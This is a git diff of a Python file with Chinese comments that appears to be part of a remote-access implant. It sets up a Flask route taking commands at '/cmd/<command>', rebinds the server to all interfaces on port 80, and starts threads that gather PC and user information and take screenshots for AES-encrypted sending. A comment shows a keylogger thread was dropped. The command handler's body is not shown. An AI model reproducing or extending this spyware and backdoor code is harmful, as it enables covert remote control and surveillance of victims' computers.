@@ -1,3 +1,8 @@
+# -*- coding:utf-8 -*-
+"""
+作者：shinian
+创建日期：2024/5/24 22:01
+"""
 import base64  # 导入用于base64编码和解码的模块
 import getpass  # 导入用于获取用户信息的模块
 import json  # 导入用于处理JSON数据的模块
@@ -5,12 +10,10 @@ import random  # 导入用于生成随机数的模块
 import subprocess  # 导入用于运行子进程的模块
 import threading  # 导入用于多线程处理的模块
 import time  # 导入用于处理时间相关操作的模块
-from datetime import datetime  # 导入用于处理日期和时间的模块
-
 import netifaces  # 导入用于获取网络接口信息的模块
 import requests  # 导入用于发送HTTP请求的模块
 from flask import Flask  # 导入Flask框架
-
+from datetime import datetime  # 导入用于处理日期和时间的模块
 from S_C.mod.screenshotter import run  # 导入自定义的截图模块
 from S_C.stage.aes_utils import encrypt  # 导入自定义的AES加密函数
 
@@ -19,6 +22,7 @@ app = Flask(__name__)  # 创建Flask应用实例
 # 生成唯一的ID，格式为"年-月-日 时-分-秒"
 ID = datetime.now().strftime("%Y-%m-%d %H-%M-%S")
 IP = "192.168.117.190"
+
 
 # 定义一个路由用于接收客户端发送的命令
 @app.route('/cmd/<command>')
@@ -94,7 +98,7 @@ def screen():
 
 # 启动 Flask 服务器的函数
 def run_server():
-    app.run(f'{IP}', 80, False)  # 运行Flask服务器
+    app.run("0.0.0.0", 80, False)  # 运行Flask服务器
 
 
 if __name__ == '__main__':
@@ -103,7 +107,7 @@ if __name__ == '__main__':
     server_thread.start()
     time.sleep(1)  # 等待服务器启动
 
-    # 创建并启动 pc_info、screenshotter 和 keylogger 线程
+    # 创建并启动 pc_info、screenshotter线程
     threads = [threading.Thread(target=func) for func in [pc_info, screen]]
     for thread in threads:
         thread.start()  # 启动线程
